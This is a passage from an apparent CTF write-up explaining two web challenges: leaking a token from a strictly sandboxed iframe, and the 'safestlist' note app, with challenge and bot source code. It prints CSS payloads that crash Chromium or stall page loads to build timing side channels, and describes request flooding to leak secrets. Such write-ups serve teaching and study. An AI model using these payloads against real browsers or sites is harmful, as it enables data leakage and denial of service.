class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1 data-token="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>code<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> content<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can insert any code into the iframe, with the goal of stealing the token from the same webpage.</p><p>The key point is that the iframe’s sandbox is strict, as well as the Content Security Policy (CSP). From these two clues, we can deduce the following restrictions:</p><ol><li><code>defeault-src &#39;none&#39;</code>, which prohibits the inclusion of any external resources.</li><li><code>sandbox</code>, which means that no JavaScript can be executed and no redirection can be done through meta tags.</li></ol><p>With JavaScript disabled, the attack surface is greatly reduced, so we can only work with HTML and CSS. The CSS for this challenge has <code>unsafe-inline</code> enabled, so we can add CSS rules.</p><p>However, it seems that we cannot send requests to external resources. So, either we need to find a bypass (such as DNS prefetch, but it may not be applicable to this challenge), or we need to combine it with other parts of the challenge.</p><p>The operation of the bot in this challenge is different:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> createServer <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'http'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> readFileSync <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'fs'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'child_process'</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> randomInt <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'crypto'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">timeout</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">wait</span> <span class="token operator">=</span> <span class="token parameter">child</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> child<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> index <span class="token operator">=</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token parameter">code</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> proc <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'visit.js'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> code<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">detached</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token function">wait</span><span class="token punctuation">(</span>proc<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>proc<span class="token punctuation">.</span>exitCode <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    process<span class="token punctuation">.</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>proc<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/bot'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>browserOpen<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'already open!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>code <span class="token operator">||</span> code<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'visiting'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">??</span> <span class="token string">'dice&#123;flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If <code>browserOpen</code> is true, we can obtain information from the response. So, when I saw the challenge, I had an idea: what would happen if we crash Chromium? Can we leak the token using this method?</p><p>For example, if we write a CSS rule like <code>h1[data-token^=&quot;0&quot;] &#123; /*crash*/ &#125;</code> to crash Chromium, it might speed up or slow down the execution of the bot, allowing us to determine if this selector matches.</p><p>Later, my teammate found a way to crash Chromium from the Chromium issues:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">h1[data-token^="a"]</span> <span class="token punctuation">&#123;</span>    <span class="token property">--c1</span><span class="token punctuation">:</span> <span class="token function">color-mix</span><span class="token punctuation">(</span>in srgb<span class="token punctuation">,</span> blue 50%<span class="token punctuation">,</span> red<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">--c2</span><span class="token punctuation">:</span> <span class="token function">srgb</span><span class="token punctuation">(</span>from <span class="token function">var</span><span class="token punctuation">(</span>--c1<span class="token punctuation">)</span> r g b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In the post-competition discussion, I also saw someone in Discord posting a payload that made the webpage load extremely slowly, achieving a similar effect. This is what @Trixter posted:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">html:has([data-token^="a"])</span> <span class="token punctuation">&#123;</span>      <span class="token property">--a</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>      <span class="token property">--b</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--c</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--d</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--e</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--f</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">*</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--f<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It’s somewhat similar to the Billion Laughs attack, constructing a super large payload repeatedly to slow down the speed.</p><p>After slowing down the speed, we can measure the time it takes for the webpage to load using the method mentioned earlier. If it exceeds 10 seconds, it will time out, allowing us to leak the flag.</p><h2><span id="webx2fsafestlist-2-solves">web&#x2F;safestlist (2 solves)</span></h2><p>This challenge is a modified version of a challenge I previously solved: <a href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/">SekaiCTF 2022 Notes and concurrent limit</a>. Let me briefly describe the modified version.</p><p>This challenge is a classic note app. You can create new notes, but the problem is that the note content will be sanitized using <code>DOMPurify.sanitize</code>, so XSS is not possible. The CSP part is <code>default-src &#39;self&#39;</code>, which means that requests can only be sent to the origin of the challenge.</p><p>In other words, you cannot send requests outside.</p><p>In addition to creating notes, you can also delete notes using the index of the note.</p><p>The core of this problem is the code for creating a note:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>text <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Missing text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> userNotes <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> totalLen <span class="token operator">=</span> userNotes<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> curr</span><span class="token punctuation">)</span> <span class="token operator">=></span> prev <span class="token operator">+</span> curr<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span>    reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Note the <code>userNotes.sort();</code>, which sorts the notes based on their content. The format of the flag is <code>dice&#123;[a-z]+&#125;</code>. By using this sorting feature, a simple strategy can be derived.</p><p>Assuming the flag is <code>dice&#123;c&#125;</code>, and we first create a note with <code>dice&#123;a</code>, after creating it, we delete the first note. At this point, <code>dice&#123;a</code> will be deleted, leaving the flag <code>dice&#123;c&#125;</code>.</p><p>If we first create a note with <code>dice&#123;d</code>, and then delete the first one, <code>dice&#123;c&#125;</code> will be deleted, leaving the newly created <code>dice&#123;d</code>.</p><p>In other words, depending on the order of creation and deletion of notes, the note that remains will be different.</p><p>If I can know which note remains in the end, I can infer the order of the flag. If the note I created remains, it means that the flag must be at the beginning and in lexicographical order.</p><p>Therefore, the key to this problem is how to know which note remains.</p><p>Based on last year’s solution, my initial idea was to make the server side busy. Node.js is single-threaded, so it cannot handle other requests until it finishes processing one (asynchronous is a different story).</p><p>So my idea is to create a note with a bunch of <code>&lt;img src=/?&#123;random_number&#125;&gt;</code>, which can send about 700-1000 requests within the word limit. By sending a bunch of requests to the server, we make the server busy.</p><p>There is another difference in this problem, which is the bot:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// clear all data</span>    <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">rm</span><span class="token punctuation">(</span>tmpDir<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">force</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// set flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"input[type=text]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> flag<span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/create']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to the submitted site</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// check on notes now that all other windows are closed</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/view']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token 